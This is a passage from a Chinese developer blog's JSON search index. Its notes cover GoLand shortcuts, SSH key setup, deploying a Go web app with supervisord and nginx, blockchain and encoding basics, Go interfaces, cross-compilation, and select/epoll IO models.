快捷命令\n\n删除 cmd + x\n\n复制 cmd + d\n\nCMD + E 呼出最近文件和常用功能\n\nfavorites 可以查看书签/断点/收藏\n\n各种搜索 两次 shift\n\n比较文件 选择两个 cmd+d\n\nctrl + shift + h 搜索\n\ncmd + [] 进入返回\n\n+ 开启标签移动\n\t-  cmd + [] + shift\n\n+ 代码提交比较\n\t- VCS -> Local History | Commit 查看\n\n+ 文件导航 \n\t- cmd + f12 \n\t- cmd + 7\n\n+ 看定义所有的方法 \n\t- cmd + b\n\n+ 通过 interface 查看实现的Struct   \n\t- shift + cmd + b \n\t- ctrl + h 贤淑类型层次  感觉差不多实现功能了\n\n+ super method  查看struct实现了哪些接口, 找爹\n\t- cmd + u\n","tags":["golang"],"categories":["golang"]},{"title":"ssh_scp免密和服务器建立信任","url":"%2Fp%2Ffe0e5995.html","content":"\n+ 在mac上生成密钥\n\t\n\t生成两个文件`vultr`  `vultr.pub`\n\t\n\t`ssh-keygen -t rsa`   //passphrase可以为空\n\n+ 发送到远程服务器\n\n\t第一种方式: \n\t\n\t`scp ~/.ssh/vultr.pub root@207.246.80.69:/root/.ssh/authorized_keys`\n\t\n\t第二种方式:\n\t\n\t`ssh-copy-id -i ~/.ssh/vultr.pub root@207.246.80.69`\n\n<!-- more -->\n+ 添加到vultr的ssh key里(这一步可以不做)\n\n\t`https://my.vultr.com/sshkeys/`\n\n\t\n\n+ 一键连接到ssh\n\t\n\t命令: `ssh -i ~/.ssh/vultr root@207.246.80.69`\n\n+ scp files\n\n\t命令: `scp -i ~/.ssh/vultr files root@207.246.80.69:/root`\n","tags":["ssh"],"categories":["命令"]},{"title":"linux部署golang的方式","url":"%2Fp%2F8956ebfb.html","content":"\n\n### 通过ssh文件上传到服务器\n\n```\nscp -i /Users/liuwei/.ssh/aws.pem -C -r /Users/liuwei/golang/src/web ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com:/home/ubuntu\n```\n\naws.pem chmod 400\n\nscp  -C 加一个可能会更快\n\n### 发行部署\n\nGo 语言的应用最后编译之后是一个二进制文件，你只需要 copy 这个应用到服务器上，运行起来就行。beego 由于带有几个静态文件、配置文件、模板文件三个目录，所以用户部署的时候需要同时 copy 这三个目录到相应的部署应用之下，下面以我实际的应用部署为例：\n\n<!-- more -->\n```\n$ mkdir /opt/app/beepkg\n$ cp beepkg /opt/app/beepkg\n$ cp -fr views /opt/app/beepkg\n$ cp -fr static /opt/app/beepkg\n$ cp -fr conf /opt/app/beepkg\n\n```\n这样在 /opt/app/beepkg 目录下面就会显示如下的目录结构：\n\n```\n.\n├── conf\n│   ├── app.conf\n├── static\n│   ├── css\n│   ├── img\n│   └── js\n└── views\n    └── index.tpl\n├── beepkg\n\n```\n这样我们就已经把我们需要的应用搬到服务器了，那么接下来就可以开始部署了。\n\n就是一共上传3个文件夹和1个可执行文件\n\n### 1. 独立部署\n在 linux 下面部署，我们可以利用 nohup 命令，把应用部署在后端，如下所示：\n\n```\nnohup ./beepkg &\n```\n这样你的应用就跑在了 Linux 系统的守护进程\n\n\n\n### 2. supervisord 管理\nsupervisord 是用 Python 实现的一款非常实用的进程管理工具，supervisord 还要求管理的程序是非 daemon 程序，supervisord 会帮你把它转成 daemon 程序，因此如果用 supervisord 来管理 nginx 的话，必须在 nginx 的配置文件里添加一行设置 daemon off 让 nginx 以非 daemon 方式启动。\n\n1. 安装 setuptools\n\n```\nwget http://pypi.python.org/packages/2.7/s/setuptools/setuptools-0.6c11-py2.7.egg\nsh setuptools-0.6c11-py2.7.egg\neasy_install supervisor\necho_supervisord_conf >/etc/supervisord.conf\nmkdir /etc/supervisord.conf.d\n```\n\n2. 修改配置 /etc/supervisord.conf\n\n```\n[include]\nfiles = /etc/supervisord.conf.d/*.conf\n```\n\n3. 新建管理的应用\ncd /etc/supervisord.conf.d\nvim beepkg.conf\n配置文件：\n\n```\n[program:beepkg]\ndirectory = /opt/app/beepkg\ncommand = /opt/app/beepkg/beepkg\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/beepkg.log\n```\n\n##### supervisord 管理\n\nsupervisord 安装完成后有两个可用的命令行 supervisord 和 supervisorctl，命令使用解释如下：\n\n  ● supervisord，初始启动 Supervisord，启动、管理配置中设置的进程。\n\n  ● supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx 为 [program:beepkg] 里配置的值，这个示例就是 beepkg。\n\n  ● supervisorctl start programxxx，启动某个进程\n\n  ● supervisorctl restart programxxx，重启某个进程\n\n  ● supervisorctl stop groupworker: ，重启所有属于名为 groupworker 这个分组的进程(start,restart 同理)\n\n  ● supervisorctl stop all，停止全部进程，注：start、restart、stop 都不会载入最新的配置文件。\n\n  ● supervisorctl reload，载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程。\n\n  ● supervisorctl update，根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启。\n\n注意：显示用 stop 停止掉的进程，用 reload 或者 update 都不会自动重启。\n\n\n> 自己的配置\n\n```\nweb.conf\n\n[program:web]\ndirectory = /home/ubuntu/web\ncommand = /home/ubuntu/web/web\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/web.log\n```\n\nsudo supervisord //启动\nsudo supervisorctl stop web //结束\n\n\n\n### 3. nginx部署\n\n1 安装nginx \n\n```\nsudo apt-get install nginx\n```\n\nUbuntu安装之后的文件结构大致为：\n\n  ● 所有的配置文件都在/etc/nginx下，并且每个虚拟主机已经安排在了/etc/nginx/sites-available下\n\n  ● 程序文件在/usr/sbin/nginx\n\n  ● 日志放在了/var/log/nginx中\n\n  ● 并已经在/etc/init.d/下创建了启动脚本nginx\n\n  ● 默认的虚拟主机的目录设置在了/var/www/nginx-default (有的版本 默认的虚拟主机的目录设置在了/var/www, 请参考/etc/nginx/sites-available里的配置)\n\n2 启动nginx\n\n```\nsudo /etc/init.d/nginx start\n```\n直接访问ip http://54.191.9.26/ 可以看到nginx安装成功\n\n\n3 处理golang\n\nGo 是一个独立的 HTTP 服务器，但是我们有些时候为了 nginx 可以帮我做很多工作，例如访问日志，cc 攻击，静态服务等，nginx 已经做的很成熟了，Go 只要专注于业务逻辑和功能就好，所以通过 nginx 配置代理就可以实现多应用同时部署，如下就是典型的两个应用共享 80 端口，通过不同的域名访问，反向代理到不同的应用。\n\n```\nserver {\n    listen       80;\n    server_name  .a.com;\n\n    charset utf-8;\n    access_log  /home/a.com.access.log;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_a/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8080;\n    }\n}\n\nserver {\n    listen       80;\n    server_name  .b.com;\n\n    charset utf-8;\n    access_log  /home/b.com.access.log  main;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_b/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8081;\n    }\n}\n```\n\n> 自己的配置\n\nsudo vi /etc/nginx/sites-available/default\n\n把 default 注释掉\n\n```\nserver {\n        listen       80;\n        server_name  .xuanyueting.top;\n\n        charset utf-8;\n        access_log  /home/ubuntu/web/xuanyueting.log;\n\n        location /(css|js|fonts|img)/ {\n                access_log off;\n                expires 1d;\n\n                root \"/home/ubuntu/web/static\";\n                try_files $uri @backend;\n        }\n        location / {\n                try_files /_not_exists_ @backend;\n        }\n\n        location @backend {\n                proxy_set_header x-forwarded-for $remote_addr;\n                proxy_set_header host            $http_host;\n\n                proxy_pass http://127.0.0.1:8080;\n        }\n}\n```\n\n\n","tags":["golang"],"categories":["golang"]},{"title":"区块链基础","url":"%2Fp%2Feb2c6f22.html","content":"\n# 区块链\n\n区块链属于一种去中心化的记录技术。参与到系统上的节点，可能不属于同一组织、彼此无需信任；区块链数据由所有节点共同维护，每个参与维护节点都能复制获得一份完整记录的拷贝。\n\n### 特点\n跟传统的记账技术相比，其特点应该包括：\n\n* 维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改；\n* 去中心化，或者说多中心化，无需集中的控制而能达成共识，实现上尽量分布式；\n* 通过密码学的机制来确保交易无法抵赖和破坏，并尽量保护用户信息和记录的隐私性。\n\n\n### 基本原理\n区块链的基本原理理解起来并不难。基本概念包括：\n\n* 交易（Transaction）：一次操作，导致账本状态的一次改变，如添加一条记录；\n* 区块（Block）：记录一段时间内发生的交易和状态结果，是对当前账本状态的一次共识；\n* 链（Chain）：由一个个区块按照发生顺序串联而成，是整个状态变化的日志记录。\n<!-- more -->\n\n### 分类\n根据参与者的不同，可以分为公开（Public）链、联盟（Consortium）链和私有（Private）链。\n目前来看，公开链将会更多的吸引社区和媒体的眼球，但更多的商业价值应该在联盟链和私有链上。\n\n根据使用目的和场景的不同，又可以分为以数字货币为目的的货币链，以记录产权为目的的产权链，以众筹为目的的众筹链等。\n\n### 存储\n首先，区块链不是数据库。虽然区块链也可以用来存储数据，但它要解决的问题是多方的互信问题。单纯从存储数据角度，它的效率可能不高，笔者也不推荐把大量的原始数据放到区块链上。\n\n### 计算\n区块链技术还能带来更通用的计算能力。Hyperledger 和 Ethereum 就试图做类似的事情，基于区块链再做一层平台层，让别人基于平台开发应用变得更简单。\n\n\n\n\n# 分布式问题\n\n### 一致性\n\n理想的分布式系统一致性应该满足：\n\n* 可终止性（Termination）：一致的结果在有限时间内能完成；\n* 共识性（Consensus）：不同节点最终完成决策的结果应该相同；\n* 合法性（Validity）：决策的结果必须是其它进程提出的提案。\n\n\n实际上，越强的一致性要求往往意味着越弱的性能。\n\n\n### FLP 不可能性原理\n\nFLP 不可能原理：在网络可靠，存在节点失效（即便只有一个）的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性算法。\n\nFLP 不可能原理实际上告诉人们，不要浪费时间去为异步分布式系统设计在任意场景下都能实现共识的算法。\n\n\n### CAP 原理\n\n* 一致性（Consistency）：任何操作应该都是原子的，发生在后面的事件能看到前面事件发生导致的结果，注意这里指的是强一致性；\n* 可用性（Availablity）：在有限时间内，任何非失败节点都能应答请求；\n* 分区容忍性（Partition）：网络可能发生分区，即节点之间的通信不可保障。\n\n1. 弱化一致性  对结果一致性不敏感的应用，可以允许在新版本上线后过一段时间才更新成功，期间不保证一致性。\n\n2. 弱化可用性  对结果一致性很敏感的应用，例如银行取款机，当系统故障时候会拒绝服务。MongoDB、Redis 等为此设计。Paxos、Raft 等算法，主要处理这种情况。\n\n3. 弱化分区容忍性  现实中，网络分区出现概率减小，但较难避免。某些关系型数据库、ZooKeeper 即为此设计。\n\n\n### ACID 原则\n\n\n即 Atomicity（原子性）、Consistency（一致性）、Isolation（隔离性）、Durability（持久性）。\n\nACID 原则描述了对分布式数据库的一致性需求，同时付出了可用性的代价。\n\n* Atomicity：每次操作是原子的，要么成功，要么不执行；\n* Consistency：数据库的状态是一致的，无中间状态；\n* Isolation：各种操作彼此互相不影响；\n* Durability：状态的改变是持久的，不会失效。\n\n一个与之相对的原则是 BASE（Basic Availiability，Soft state，Eventually Consistency），牺牲掉对一致性的约束（最终一致性），来换取一定的可用性。\n\n\n# 密码学\n\n\n### hash\n\n一个优秀的 hash 算法，将能实现：\n\n* 正向快速：给定明文和 hash 算法，在有限时间和有限资源内能计算出 hash 值。\n* 逆向困难：给定（若干） hash 值，在有限时间内很难（基本不可能）逆推出明文。\n* 输入敏感：原始输入信息修改一点信息，产生的 hash 值看起来应该都有很大不同。\n* 冲突避免：很难找到两段内容不同的明文，使得它们的 hash 值一致（发生冲突）\n\n\n\n### 加解密\n\n根据加解密的密钥是否相同，算法可以分为对称加密（symmetric cryptography，又称公共密钥加密，common-key cryptography）和非对称加密(asymmetric cryptography，又称公钥加密，public-key cryptography)。两种模式适用于不同的需求，恰好形成互补，很多时候也可以组合使用，形成混合加密机制。\n\n\n* 对称加密\n\n优点是加解密效率高（速度快，空间占用小），加密强度高。\n\n缺点是参与多方都需要持有密钥，一旦有人泄露则安全性被破坏；另外如何在不安全通道下分发密钥也是个问题。\n\n适用于大量数据的加解密；不能用于签名场景；需要提前分发密钥。\n\n* 非对称加密\n\n非对称加密是现代密码学历史上最为伟大的发明，可以很好的解决对称加密需要的提前分发密钥问题。\n\n顾名思义，加密密钥和解密密钥是不同的，分别称为公钥和私钥。\n公钥一般是公开的，人人可获取的，私钥一般是个人自己持有，不能被他人获取。\n优点是公私钥分开，不安全通道也可使用。\n缺点是加解密速度慢，一般比对称加解密算法慢两到三个数量级；同时加密强度相比对称加密要差。\n\n一般适用于签名场景或密钥协商，不适于大量数据的加解密。\n\n* 混合加密机制\n\n即先用计算复杂度高的非对称加密协商一个临时的对称加密密钥（会话密钥，一般相对内容来说要短的多），然后双方再通过对称加密对传递的大量数据进行加解密处理。\n\n典型的场景是现在大家常用的 HTTPS 机制。\n\n\n\n","tags":["区块链"],"categories":["计算机基础"]},{"title":"音频基础","url":"%2Fp%2F279c3cd4.html","content":"\n\n### 音频基础\n\n当前，我们所说的音频，都是数字音频。数字音频由采样频率、采样精度、声音通道数三个部分组成。\n\n采样频率：既采样率，指记录声音时每秒的采样个数，它用赫兹(Hz)来表示。\n采样精度：指记录声音的动态范围，它以位(Bit)为单位。\n声音通道：既声道数（1-8个）。\n\n采样率根据使用类型不同大概有以下几种（k既千位符号，1khz=1000hz）：\n8khz：电话等使用，对于记录人声已经足够使用。\n22.05khz：广播使用频率。\n44.1kb：音频CD。\n48khz：DVD、数字电视中使用。\n96khz-192khz：DVD-Audio、蓝光高清等使用。\n\n采样精度常用范围为8bit-32bit，而CD中一般都使用16bit。\n<!-- more -->\n\n\n音频的比特率，实际上就是压缩比例。\n但比特率本身并不对文件的质量有直接影响，例如我们把128kb的文件作为源文件，即使转换成320kb的文件，其音质依然不会比128kb好。\n那么比特率中的数字和字母到底是什么意思呢？首先看128k的全称“128kbps”，我们试着分解一下：128是数字，k是千位符，b是单位，s是秒，ps其实就是“/s”。这样来看，128kbps就是128kb/s。也就是每秒128kb。\n\n\n\n### speex格式录音参数:\n\n```\nquality = 9  \t                       \t\t//speex质量,值越大质量越好,文件越大  open()的参数\nspeex_version = \"speex-1.2rc\"      //speex版本\nospeex_version_id = 1 \t\t\t//speex版本id\nheader_size = 80 \t \t\t\t//speex头信息大小\nrate = 16000\t\t\t\t\t//采样率大小\nmode = 1\t\t\t \t\t\t//mode  0是窄带模式, 1是宽带模式 (0=NB, 1=WB, 2=UWB)\nbitrate = -1 \t\t \t\t\t//比特率\nframe_size = 320   \t \t\t\t//缓冲区大小  窄带对应160, 宽带对应320  (NB=160, WB=320, UWB=640)\nvbr = 1\t\t\t\t\t\t//是否使用可变比特率\nnframes  = 1 \t\t\t\t\t// 每帧的speex包的数量\nchannels =1    \t\t\t        //音频输入的声道 \t1是单声道，2是立体声\n```","tags":["音频"],"categories":["计算机基础"]},{"title":"字符编码","url":"%2Fp%2Febfb97d0.html","content":"\n### ASCII码\nASCII码的取值范围是0~127，可以用7个bit表示。C语言中char型变量的大小规定为一字节，如果存放ASCII码则只用到低7位，高位为0。以下是ASCII码表：\n\n\n绝大多数计算机的一个字节是8位，取值范围是0~255，而ASCII码并没有规定编号为128~255的字符，为了能表示更多字符，各厂商制定了很多种ASCII码的扩展规范。注意，虽然通常把这些规范称为扩展ASCII码（Extended ASCII），但其实它们并不属于ASCII码标准。\n\n<!-- more -->\n\n### Unicode和UTF-8\n\n为了统一全世界各国语言文字和专业领域符号（例如数学符号、乐谱符号）的编码，ISO制定了ISO 10646标准，也称为UCS（Universal Character Set）。UCS编码的长度是31位，可以表示231个字符。如果两个字符编码的高位相同，只有低16位不同，则它们属于一个平面（Plane），所以一个平面由216个字符组成。目前常用的大部分字符都位于第一个平面（编码范围是U-00000000~U-0000FFFD），称为BMP（Basic Multilingual Plane）或Plane 0，为了向后兼容，其中编号为0~256的字符和Latin-1相同。UCS编码通常用U-xxxxxxxx这种形式表示，而BMP的编码通常用U+xxxx这种形式表示，其中x是十六进制数字。在ISO制定UCS的同时，另一个由厂商联合组织也在着手制定这样的编码，称为Unicode，后来两家联手制定统一的编码，但各自发布各自的标准文档，所以UCS编码和Unicode码是相同的。\n\n\n有了字符编码，另一个问题就是这样的编码在计算机中怎么表示。现在已经不可能用一个字节表示一个字符了，最直接的想法就是用四个字节表示一个字符，这种表示方法称为UCS-4或UTF-32，UTF是Unicode Transformation Format的缩写。一方面这样比较浪费存储空间，由于常用字符都集中在BMP，高位的两个字节通常是0，如果只用ASCII码或Latin-1，高位的三个字节都是0。另一种比较节省存储空间的办法是用两个字节表示一个字符，称为UCS-2或UTF-16，这样只能表示BMP中的字符，但BMP中有一些扩展字符，可以用两个这样的扩展字符表示其它平面的字符，称为Surrogate Pair。无论是UTF-32还是UTF-16都有一个更严重的问题是和C语言不兼容，在C语言中0字节表示字符串结尾，库函数strlen、strcpy等等都依赖于这一点，如果字符串用UTF-32存储，其中有很多0字节并不表示字符串结尾，这就乱套了。\n\n\n\nUNIX之父Ken Thompson提出的UTF-8编码很好地解决了这些问题，现在得到广泛应用。\n\nUTF-8具有以下性质：\n\n\n  ● 编码为U+0000~U+007F的字符只占一个字节，就是0x00~0x7F，和ASCII码兼容。\n  \n  ● 编码大于U+007F的字符用2~6个字节表示，每个字节的最高位都是1，而ASCII码的最高位都是0，因此非ASCII码字符的表示中不会出现ASCII码字节（也就不会出现0字节）。\n  \n  ● 用于表示非ASCII码字符的多字节序列中，第一个字节的取值范围是0xC0~0xFD，根据它可以判断后面有多少个字节也属于当前字符的编码。后面每个字节的取值范围都是0x80~0xBF，见下面的详细说明。\n  \n  ● UCS定义的所有231个字符都可以用UTF-8编码表示出来。\n  \n  ● UTF-8编码最长6个字节，BMP字符的UTF-8编码最长三个字节。\n  \n  ● 0xFE和0xFF这两个字节在UTF-8编码中不会出现。\n\n具体来说，UTF-8编码有以下几种格式：\n\n```\nU-00000000 – U-0000007F:  0xxxxxxx\nU-00000080 – U-000007FF:  110xxxxx 10xxxxxx\nU-00000800 – U-0000FFFF:  1110xxxx 10xxxxxx 10xxxxxx\nU-00010000 – U-001FFFFF:  11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-00200000 – U-03FFFFFF:  111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-04000000 – U-7FFFFFFF:  1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n```\n第一个字节要么最高位是0（ASCII字节），要么最高两位都是1，\n\n最高位之后1的个数决定后面有多少个字节也属于当前字符编码，例如111110xx，最高位之后还有四个1，表示后面有四个字节也属于当前字符的编码。后面每个字节的最高两位都是10，可以和第一个字节区分开。这样的设计有利于误码同步，例如在网络传输过程中丢失了几个字节，很容易判断当前字符是不完整的，也很容易找到下一个字符从哪里开始，结果顶多丢掉一两个字符，而不会导致后面的编码解释全部混乱了。上面的格式中标为x的位就是UCS编码，最后一种6字节的格式中x位有31个，可以表示31位的UCS编码，UTF-8就像一列火车，第一个字节是车头，后面每个字节是车厢，其中承载的货物是UCS编码。UTF-8规定承载的UCS编码以大端表示，也就是说第一个字节中的x是UCS编码的高位，后面字节中的x是UCS编码的低位。\n例如U+00A9（©字符）的二进制是10101001，编码成UTF-8是11000010 10101001（0xC2 0xA9），但不能编码成11100000 10000010 10101001，UTF-8规定每个字符只能用尽可能少的字节来编码。\n\n\n```\n10101001\n11000010 10101001     \t           // 大端也符合阅读规范\n\n\n10101001\n11100000 10000010 10101001   //这样不可以, 用尽可能少的字节来编码\n```\n\n\n\n### 在Linux C编程中使用Unicode和UTF-8\n\n目前各种Linux发行版都支持UTF-8编码，当前系统的语言和字符编码设置保存在一些环境变量中，可以通过locale命令查看：\n\n```\n$ locale\nLANG=en_US.UTF-8\nLC_CTYPE=\"en_US.UTF-8\"\nLC_NUMERIC=\"en_US.UTF-8\"\nLC_TIME=\"en_US.UTF-8\"\nLC_COLLATE=\"en_US.UTF-8\"\nLC_MONETARY=\"en_US.UTF-8\"\nLC_MESSAGES=\"en_US.UTF-8\"\nLC_PAPER=\"en_US.UTF-8\"\nLC_NAME=\"en_US.UTF-8\"\nLC_ADDRESS=\"en_US.UTF-8\"\nLC_TELEPHONE=\"en_US.UTF-8\"\nLC_MEASUREMENT=\"en_US.UTF-8\"\nLC_IDENTIFICATION=\"en_US.UTF-8\"\nLC_ALL=\n```\n常用汉字也都位于BMP中，所以一个汉字的存储通常占3个字节。\n\n\n\n\n例如编辑一个C程序：\n\n```\n#include <stdio.h>\n\nint main(void)\n{\n\tprintf(\"你好\\n\");\n\treturn 0;\n}\n```\n源文件是以UTF-8编码存储的：\n\n```\n$ od -tc nihao.c \n0000000   #   i   n   c   l   u   d   e       <   s   t   d   i   o   .\n0000020   h   >  \\n  \\n   i   n   t       m   a   i   n   (   v   o   i\n0000040   d   )  \\n   {  \\n  \\t   p   r   i   n   t   f   (   \" 344 275\n0000060 240 345 245 275   \\   n   \"   )   ;  \\n  \\t   r   e   t   u   r\n0000100   n       0   ;  \\n   }  \\n\n0000107\n```\n其中八进制的344 375 240（十六进制e4 bd a0）就是“你”的UTF-8编码，八进制的345 245 275（十六进制e5 a5 bd）就是“好”。把它编译成目标文件，\"你好\\n\"这个字符串就成了这样一串字节：e4 bd a0 e5 a5 bd 0a 00，汉字在其中仍然是UTF-8编码的，一个汉字占3个字节，这种字符在C语言中称为多字节字符（Multibyte Character）。运行这个程序相当于把这一串字节write到当前终端的设备文件。如果当前终端的驱动程序能够识别UTF-8编码就能打印出汉字，如果当前终端的驱动程序不能识别UTF-8编码（比如一般的字符终端）就打印不出汉字。也就是说，像这种程序，识别汉字的工作既不是由C编译器做的也不是由libc做的，C编译器原封不动地把源文件中的UTF-8编码复制到目标文件中，libc只是当作以0结尾的字符串原封不动地write给内核，识别汉字的工作是由终端的驱动程序做的。\n\n\n\n但是仅有这种程度的汉字支持是不够的，有时候我们需要在C程序中操作字符串里的字符，比如求字符串\"你好\\n\"中有几个汉字或字符，用strlen就不灵了，因为strlen只看结尾的0字节而不管字符串里存的是什么，求出来的是字节数7。为了在程序中操作Unicode字符，C语言定义了宽字符（Wide Character）类型wchar_t和一些库函数。\n\n\n在字符常量或字符串字面值前面加一个L就表示宽字符常量或宽字符串，例如定义wchar_t c = L'你';，变量c的值就是汉字“你”的31位UCS编码，而L\"你好\\n\"就相当于{L'你', L'好', L'\\n', 0}，wcslen函数就可以取宽字符串中的字符个数。\n\n\n```\n#include <stdio.h>\n#include <locale.h>\n\nint main(void)\n{\n\tif (!setlocale(LC_CTYPE, \"\")) {\n\t\tfprintf(stderr, \"Can't set the specified locale! \"\n\t\t\t\"Check LANG, LC_CTYPE, LC_ALL.\\n\");\n\t\treturn 1;\n\t}\n\tprintf(\"%ls\", L\"你好\\n\");\n\treturn 0;\n}\n```\n\n宽字符串L\"你好\\n\"在源代码中当然还是存成UTF-8编码的，但编译器会把它变成4个UCS编码0x00004f60 0x0000597d 0x0000000a 0x00000000保存在目标文件中，按小端存储就是60 4f 00 00 7d 59 00 00 0a 00 00 00 00 00 00 00，用od命令查看目标文件应该能找到这些字节。\n\n\nprintf的%ls转换说明表示把后面的参数按宽字符串解释，不是见到0字节就结束，而是见到UCS编码为0的字符才结束，但是要write到终端仍然需要以多字节编码输出，这样终端驱动程序才能识别，所以printf在内部把宽字符串转换成多字节字符串再write出去。事实上，C标准并没有规定多字节字符必须以UTF-8编码，也可以使用其它的多字节编码，在运行时根据环境变量确定当前系统的编码，所以在程序开头需要调用setlocale获取当前系统的编码设置，如果当前系统是UTF-8的，printf就把UCS编码转换成UTF-8编码的多字节字符串再write出去。一般来说，程序在做内部计算时通常以宽字符编码，如果要存盘或者输出给别的程序，或者通过网络发给别的程序，则采用多字节编码。","tags":["字符"],"categories":["计算机基础"]},{"title":"golang_struct_interface嵌套传参和多态","url":"%2Fp%2Fa5099912.html","content":"\n\n### interface struct 嵌套\n\n1. struct struct //继承(不能多态), 如果内部struct实现了接口, 它也相当于实现了接口\n2. struct interface //可以多态\n3. interface interface  //单纯的导入\n4. interface struct  //不允许\n\n\n<!-- more -->\n\n### struct定义怎么都行, 有interface{}参与struct,就有限制\n\n#### struct方法参数是指针还是值 (此处是单纯的结构, 定义传递什么都行)\n\n无论方法参数定义成指针还是值, 都可以调用\n\n```\ntype S struct {\n\tage int\n}\n\nfunc (s S) Value() {\n\tfmt.Println(s.age)\n}\n\nfunc (s *S) Point(age int) {\n\ts.age = age\n}\n\nfunc main() {\n\ts := new(S)\n\ts.Point(1)\n\ts.Value()\n\tfmt.Printf(\"%T\\n\", s)\n\n\tv := S{}\n\tv.Point(2)\n\tv.Value()\t\t\t//此处是重点, 竟然这个也自动转换\n\tfmt.Printf(\"%T\\n\", v)\n\n\tp := &v\n\tp.Point(3)\n\tp.Value()\n\tfmt.Printf(\"%T\\n\", p)\n}\n//output:\n1\n*main.S\n2\nmain.S\n3\n*main.S\n```\n\n\n#### interface 实现struct方法参数是指针还是值\n\n\n接受者是值的都可以赋值\n\n```\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\tss := S{}\n\n\tvar i I\n\ti = ss\n\ti.Get()\n\n\ti = &ss\n\ti.Get()\n}\n```\n\n接受者是指针的只能指针赋值\n\n```\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s *S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\tss := S{}\n\n\tvar i I\n\t//i = ss , 此处编译不过\n\t//i.Get()\n\n\ti = &ss\n\ti.Get()\n}\n```\n\n\n### golang多态实现\n\n```\ntype P interface {\n\tSay()\n}\ntype P1 struct{}\ntype P2 struct{}\n\nfunc (p *P1) Say() { fmt.Println(\"say p1\") }\nfunc (p *P2) Say() { fmt.Println(\"say p2\") }\n\n\nfunc main() {\n\tp1 := &P1{}\n\tp2 := &P2{}\n\tvar p P\n\tp = p1\n\tp.Say()\n\tp = p2\n\tp.Say()\n}\n```","tags":["golang"],"categories":["golang"]},{"title":"golang多平台交叉编译","url":"%2Fp%2F37af4aa1.html","content":"\n\n### cannot execute binary file exec format error\n\n是因为mac和ubuntu的二进制格式不一致\n\n\n### 问题\n\nGo是一门编译型语言，所以在不同平台上，需要编译生成不同格式的二进制包。\n由于Go 1.5对跨平台编译有了一些改进，包括统一了编译器、链接器等。\n编译时候只需要指定两个参数：GOOS和GOARCH即可。\n\n\n<!-- more -->\n\n\n### 编译到 linux 64bit\n```\n$ GOOS=linux GOARCH=amd64 go build\n```\n### 或者可以使用 -o 选项指定生成二进制文件名字\n```\n$ GOOS=linux GOARCH=amd64 go build -o app.linux\n```\n### 编译到 linux 32bit\n```\n$ GOOS=linux GOARCH=386 go build\n```\n### 编译到 windows 64bit\n```\n$ GOOS=windows GOARCH=amd64 go build\n```\n\n### 编译到 windows 32bit\n```\n$ GOOS=windows GOARCH=386 go build\n```\n\n### 编译到 Mac OS X 64bit\n```\n$ GOOS=darwin GOARCH=amd64 go build\n```","tags":["golang"],"categories":["golang"]},{"title":"io多路复用_epoll介绍","url":"%2Fp%2F457c2d1f.html","content":"\n\n### 同步IO\n进程也可以换成线程\n\n+ 阻塞IO (问一次 + 傻等)\n\n用户进程process在Blocking IO读recvfrom操作的两个阶段都是等待的。在数据没准备好的时候，process原地等待kernel准备数据。kernel准备好数据后，process继续等待kernel将数据copy到自己的buffer。在kernel完成数据的copy后process才会从recvfrom系统调用中返回。\n\n+ 非阻塞IO (不停的催问 + 傻等)\n\nprocess在NonBlocking IO读recvfrom操作的第一个阶段是不会block等待的，如果kernel数据还没准备好，那么recvfrom会立刻返回一个EWOULDBLOCK错误。当kernel准备好数据后，进入处理的第二阶段的时候，process会等待kernel将数据copy到自己的buffer，在kernel完成数据的copy后process才会从recvfrom系统调用中返回。\n\n\n+ 多路复用 (一个家长拦截 + 谁好了谁干活)\n\nIO多路复用，就是我们熟知的select、poll、epoll模型。在IO多路复用的时候，process在两个处理阶段都是block住等待的。初看好像IO多路复用没什么用，其实select、poll、epoll的优势在于可以以较少的代价来同时监听处理多个IO。\n<!-- more -->\n\n### 异步IO\n\n异步IO要求process在recvfrom操作的两个处理阶段上都不能等待，也就是process调用recvfrom后立刻返回，kernel自行去准备好数据并将数据从kernel的buffer中copy到process的buffer在通知process读操作完成了，然后process在去处理。遗憾的是，linux的网络IO中是不存在异步IO的，linux的网络IO处理的第二阶段总是阻塞等待数据copy完成的。真正意义上的网络异步IO是Windows下的IOCP（IO完成端口）模型。\n\n\n很多时候，我们比较容易混淆non-blocking IO和asynchronous IO，认为是一样的。但是通过上图，几种IO模型的比较，会发现non-blocking IO和asynchronous IO的区别还是很明显的，non-blocking IO仅仅要求处理的第一阶段不block即可，而asynchronous IO要求两个阶段都不能block住。\n\n\n\n\n\n\n\n\n### Select\n\n\nint select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);\n\nselect 函数监视的文件描述符分3类，分别是writefds、readfds、和exceptfds。调用后select函数会阻塞，直到有描述副就绪（有数据 可读、可写、或者有except），或者超时（timeout指定等待时间，如果立即返回设为null即可），函数返回。当select函数返回后，可以 